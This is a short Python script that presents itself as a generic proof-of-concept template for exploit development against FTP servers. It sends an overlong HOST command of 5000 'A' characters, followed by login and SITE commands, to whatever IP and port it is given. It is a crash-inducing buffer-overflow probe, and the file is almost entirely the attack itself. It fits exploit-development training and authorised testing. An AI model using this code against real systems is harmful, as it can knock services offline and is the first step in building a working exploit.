#!/usr/bin/python
''' 
Content:	exploitDev PoC template for FTP targets
Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
Date: 		02/2018
	
Usage:		python ftp.py targetIP targetPort
Note:		This is just a generic template, you have to find the vulnerable option by yourself and change the position of crash
		
'''
import socket
import os
import sys



if len(sys.argv) != 3:
	print "Usage: python ftp.y targetIP targetPort"
else:
	ip = sys.argv[1]
	port = int(sys.argv[2])

	crash = "A" * 5000


	buffer="HOST "
	buffer+=crash
	buffer+="\r\n"
	buffer+="USER"
	buffer+=" "
	buffer+="bob"
	buffer+="\r\n"
	buffer+="PASS "
	buffer+="bob"
	buffer+="\r\n"
	buffer+="SITE "
	buffer+="SEDV"
	buffer+="\r\n"

	print "[*] Sending evil ftp request to target"
	expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	expl.connect((ip, port))
	expl.send(buffer)
	expl.close()
	




